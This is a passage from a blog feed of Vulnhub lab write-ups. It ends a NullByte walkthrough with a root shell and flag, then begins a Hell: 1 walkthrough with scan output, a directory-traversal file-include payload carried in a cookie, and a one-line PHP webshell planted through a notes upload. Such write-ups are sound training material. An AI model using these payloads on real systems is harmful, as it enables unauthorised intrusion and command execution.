<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch 
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
</span><span class='line'># id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
</span><span class='line'># cd /root
</span><span class='line'># ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 root root 1170 Aug  2 01:45 proof.txt</span></code></pre></td></tr></table></div></figure>


<p>Catch the flag <code>proof.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat proof.txt  
</span><span class='line'>adf11c7a9e6523e630aaf3b9b7acb51d
</span><span class='line'>
</span><span class='line'>It seems that you have pwned the box, congrats. 
</span><span class='line'>Now you done that I wanna talk with you. Write a walk & mail at
</span><span class='line'>xly0n@sigaint.org attach the walk and proof.txt
</span><span class='line'>If sigaint.org is down you may mail at nbsly0n@gmail.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>USE THIS PGP PUBLIC KEY
</span><span class='line'>
</span><span class='line'>-----BEGIN PGP PUBLIC KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
</span><span class='line'>Gms=
</span><span class='line'>=PiAQ
</span><span class='line'>-----END PGP PUBLIC KEY BLOCK-----</span></code></pre></td></tr></table></div></figure>


<p>Done and cheers Ly0n!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Hell: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1/"/>
    <updated>2015-07-17T14:01:30+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>

<p>A few of the skills needed can be seen in some posts on <a href="http://netsec.ws.">http://netsec.ws.</a> Otherwise enjoy the experience - remember that although vulnerabilities might not jump out at you straight away you may need to try some variations on the normal to get past the protections in place!&ldquo; &ndash; <a href="http://netsec.ws/">Peleus</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/hell-1,95/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Hell (<em>10.10.10.146/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Include vulnerability existed in one of cookie variable</li>
<li>File upload function without any content filter will save any evil code into pre-defined file &lsquo;note.txt&rsquo; under folder &lsquo;/tmp/&rsquo;</li>
<li>Sensitive information found in &lsquo;login.php&rsquo; which disclose jack&rsquo;s SSH password and Database password</li>
<li>Use jack&rsquo;s PGP private key file to unlock the encrypted email file and found SSH password for another account &lsquo;milk_4_life&rsquo;</li>
<li>&lsquo;game&rsquo; program has sticky bit set and will call another program &lsquo;chmod&rsquo; when user win the game, but it has not been using absolute path for &lsquo;chmod&rsquo;</li>
<li>&lsquo;Rockyou&rsquo; dictionary based brute force attacking and cracked the password for &lsquo;Truecrypt&rsquo; container file found in george&rsquo;s home folder, found SSH private key file for another account &lsquo;bazza&rsquo;</li>
<li>Very similar vulnerability as in &lsquo;game&rsquo; happened in another program &lsquo;part2&rsquo; which can be expolited to privilege escape to &lsquo;oj&rsquo;</li>
<li>&lsquo;echo&rsquo; program has Format String vulnerability which should be able to be exploited to get ROOT</li>
<li>&lsquo;Truecrypt&rsquo; has vulnerability which can make attacker to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>, <font color="FF8000">burp proxy</font>]</li>
<li>brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Local file including vulnerability detect and exploit [<font color="FF8000">curl</font>]</li>
<li>Truecrypt password brute force attacking [<font color="FF8000">truecrack</font>]</li>
<li>Analysis and write script to win &lsquo;game&rsquo; program [<font color="FF8000">python</font>]</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get privilege escalation</li>
<li>Make evil truecrypt file to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burpsuite</a></li>
<li><a href="http://curl.haxx.se/">curl</a></li>
<li><a href="https://code.google.com/p/truecrack/">truecrack</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>netdiscover</code> as routine to detect the target&rsquo;s IP address (10.10.10.146 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 10.10.10.0/24
</span><span class='line'>
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
</span><span class='line'>                                                                                                                                                             
</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
</span><span class='line'> ----------------------------------------------------------------------------- 
</span><span class='line'> 10.10.10.1      00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                               
</span><span class='line'> 10.10.10.2      00:50:56:e2:f9:10    01    060   VMWare, Inc.                                                                                               
</span><span class='line'> 10.10.10.146    00:0c:29:e2:78:6f    01    060   VMware, Inc.                                                                                               
</span><span class='line'> 10.10.10.254    00:50:56:fb:67:d4    01    060   VMWare, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.10.10.146 is our Target!</p>

<p>Next, run <code>nmap</code> to scan open services on the target.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -O -A -p- -T5 10.10.10.146
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-13 08:24 EDT
</span><span class='line'>Nmap scan report for 10-10-10-146.tpgi.com.au (10.10.10.146)
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT      STATE    SERVICE VERSION
</span><span class='line'>22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
</span><span class='line'>|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
</span><span class='line'>|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
</span><span class='line'>80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>| http-robots.txt: 2 disallowed entries 
</span><span class='line'>|_/personal/ /super_secret_login_path_muhahaha/
</span><span class='line'>|_http-title: Have fun!
</span><span class='line'>111/tcp   open     rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          44490/tcp  status
</span><span class='line'>|_  100024  1          52715/udp  status
</span><span class='line'>666/tcp   open     doom?
</span><span class='line'>1337/tcp  filtered waste
</span><span class='line'>44490/tcp open     status  1 (RPC #100024)
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>ports 22 and 80 open, and two very interesting folders found on port 80: <code>\personal</code> and <code>\super_secret_login_path_muhahaha\</code>. Then using <code>wfuzz</code> to reveal more possible hidden folders and files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wfuzz -c --hc 404 -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>Payload type: file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
</span><span class='line'>
</span><span class='line'>Total requests: 81643
</span><span class='line'>==================================================================
</span><span class='line'>ID    Response   Lines      Word         Chars          Request    
</span><span class='line'>==================================================================
</span><span class='line'>
</span><span class='line'>00001:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00002:  C=200     17 L          33 W      371 Ch    " - # directory-list-lowercase-2.3-small.txt"
</span><span class='line'>00003:  C=200     17 L          33 W      371 Ch    " - # Copyright 2007 James Fisher"
</span><span class='line'>00004:  C=200     17 L          33 W      371 Ch    "on-Share Alike 3.0 License. To view a copy of this"
</span><span class='line'>00005:  C=200     17 L          33 W      371 Ch    "# This work is licensed under the Creative Commons"
</span><span class='line'>00006:  C=200     17 L          33 W      371 Ch    "sit http://creativecommons.org/licenses/by-sa/3.0/"
</span><span class='line'>00007:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00008:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00009:  C=200     17 L          33 W      371 Ch    " Suite 300, San Francisco, California, 94105, USA."
</span><span class='line'>00010:  C=200     17 L          33 W      371 Ch    "ed case insensative list, where entries were found"
</span><span class='line'>00011:  C=200     17 L          33 W      371 Ch    " - # on atleast 3 different hosts"
</span><span class='line'>00012:  C=200     17 L          33 W      371 Ch    "d a letter to Creative Commons, 171 Second Street,"
</span><span class='line'>00016:  C=403     10 L          30 W      317 Ch    " - "
</span><span class='line'>00017:  C=200     17 L          33 W      371 Ch    " - index"
</span><span class='line'>00028:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00063:  C=302      0 L           0 W        0 Ch    " - login"
</span><span class='line'>00193:  C=200      5 L          19 W      163 Ch    " - mail"
</span><span class='line'>00198:  C=200      2 L           2 W       19 Ch    " - users"
</span><span class='line'>00470:  C=302     17 L          35 W      387 Ch    " - personal"
</span><span class='line'>00572:  C=200      7 L          21 W      170 Ch    " - server"
</span><span class='line'>01051:  C=200      5 L          20 W      179 Ch    " - notes"
</span><span class='line'>01255:  C=302      1 L           0 W        2 Ch    " - check"
</span><span class='line'>05186:  C=302     21 L          38 W      566 Ch    " - panel"
</span><span class='line'>Stopping...</span></code></pre></td></tr></table></div></figure>


<p>After I checked those revealed files, I found three interesting ones: <code>1.php</code>, <code>check.php</code> and <code>notes.php</code>.</p>

<p>Having a look at <code>1.php</code>, there is only one sentence: <font color="red">INTRUDER ALERT!</font> which is in Red color and all Capital.</p>

<p>By playing <code>check.php</code> with Burp proxy, I noticed that if user input wrong username/password, the cookie variable <code>failcount</code> will increase. However when input the wrong username/password more than 3 times, a new cookie <code>intruder</code> will be added and the value is always 1.</p>

<p>Also the <code>check.php</code> will request <code>personal.php</code> and <code>panel.php</code> as well, something noticeable in <code>panel.php</code> is that the red color alert: <font color="red">INTRUDER ALERT!</font> which is same as the content of <code>1.php</code>.</p>

<p>So based on the above facts and analysis, I could guess that the <code>panel.php</code> has included the <code>1.php</code> when user input wrong username/password over 3 times. As a result, I firstly modified the cookie value of <code>intruder</code> to <code>../../../../etc/passwd</code> but the respond is not excepted&hellip; might be the admin set a filter here or something like that. After I read the page in OWASP testing <a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)">guide</a>, I finally found a well-working payload: <code>....//....//....//....//....//....//etc//passwd</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/1.png"></p>

<p>Here is a Local File Include vulnerability found.</p>

<p>Now it&rsquo;s time to move to <code>notes.php</code>.</p>

<p>Taking a close look at notes.php, I noticed that we can write anything and it will be saved in temporary folder(mostly possible is /tmp/ in Linux) as the name is <code>note.txt</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/2.png"></p>

<p>After some trying, it is proved that the <code>note.txt</code> file is saved in <code>/tmp/</code> folder.</p>

<p>Then I wrote one-line PHP webshell to note.txt, then use File Include vulnerability found previously to include the webshell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/3.png"></p>

<p>Now I have already got a webshell and can run system command which is ready to poke around on the server file system.</p>

<p>In order to make the life easier, I use <code>curl</code> instead of burp proxy to interactive with target server.</p>

<p>First to request <code>check.php</code>, we can see that cookies <code>PHPSESSID</code> and <code>failcount</code> have been set.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl -v -L http://10.10.10.146/super_secret_login_path_muhahaha/check.php -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/check.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:06:37</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">PHPSESSID=</span><span class="s">&quot;cb11eurq57no9kbu8k09pvt0d5&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">PHPSESSID=</span><span class="s">cb11eurq57no9kbu8k09pvt0d5;</span> <span class="na">path=</span><span class="s">/</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">personal</span><span class="err">.</span><span class="na">php</span>
</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">failcount=</span><span class="s">&quot;1&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">failcount=</span><span class="s">1</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">2</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
</span><span class='line'><span class="err">&lt;</span>
</span><span class='line'><span class="err">*</span> <span class="na">Ignoring</span> <span class="na">the</span> <span class="na">response-body</span>
</span><span class='line'><span class="err">*</span> <span class="na">Connection</span> <span class="err">#</span><span class="na">0</span> <span class="na">to</span> <span class="na">host</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span> <span class="na">left</span> <span class="na">intact</span>
</span><span class='line'><span class="err">*</span> <span class="na">Issue</span> <span class="na">another</span> <span class="na">request</span> <span class="na">to</span> <span class="na">this</span> <span class="na">URL:</span> <span class="err">&#39;</span><span class="na">http:</span><span class="err">//</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/</span><span class="na">personal</span><span class="err">.</span><span class="na">php</span><span class="err">&#39;</span>
</span><span class='line'><span class="err">*</span> <span class="na">Re-using</span> <span class="na">existing</span> <span class="na">connection</span><span class="err">!</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span> <span class="na">with</span> <span class="na">host</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span>
</span><span class='line'><span class="err">*</span> <span class="na">Connected</span> <span class="na">to</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span> <span class="err">(</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">)</span> <span class="na">port</span> <span class="na">80</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span>
</span><span class='line'><span class="nt">&gt;</span> GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: failcount=1; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>&gt;
</span><span class='line'>
</span><span class='line'>root@kali:~/hell# cat cookies
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   1
</span></code></pre></td></tr></table></div></figure>


<p>New cookie &ldquo;intruder&rdquo; has been set after running the same command 3 times.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# cat cookies 
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    1</span></code></pre></td></tr></table></div></figure>


<p>Then I change the value of cookie <code>intruder</code> to include our webshell file: <code>/tmp/note.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
